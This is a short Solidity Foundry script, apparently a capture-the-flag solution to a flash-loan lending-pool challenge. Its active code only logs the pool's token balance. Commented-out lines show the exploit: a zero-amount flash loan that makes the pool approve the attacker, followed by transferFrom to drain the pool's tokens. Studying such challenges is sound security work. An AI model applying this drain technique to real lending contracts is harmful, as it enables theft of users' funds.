// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface FlashLoan {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract Solution is Script {
    address payable me = payable(0x92199EeC69Dd43c04103e49D3446052117A12C8a);
    address payable inst = payable(0x521b519EB8a42BeEa7459C4C371120402Fa1789c);
    
    address public constant token = 0xc2Fa5AD3cdA4Bb0116084023171F6fe9909d45f8;

    function run() public {
      uint pk = vm.envUint("PRIVATE_KEY");
      vm.startBroadcast(pk);
      
      // console.log(IERC20(token).balanceOf(inst));
      // uint256 amount = IERC20(token).balanceOf(inst);
      // bytes memory approveSign = abi.encodeWithSignature("approve(address,uint256)", me, amount);
      // FlashLoan(inst).flashLoan(0, me, token, approveSign);
      // IERC20(token).transferFrom(inst, me, amount);
      console.log(IERC20(token).balanceOf(inst));
      
      vm.stopBroadcast();
    }

    
    function min(uint256 a, uint256 b) private pure returns(uint256) {
        return a <= b ? a : b;
    }
}
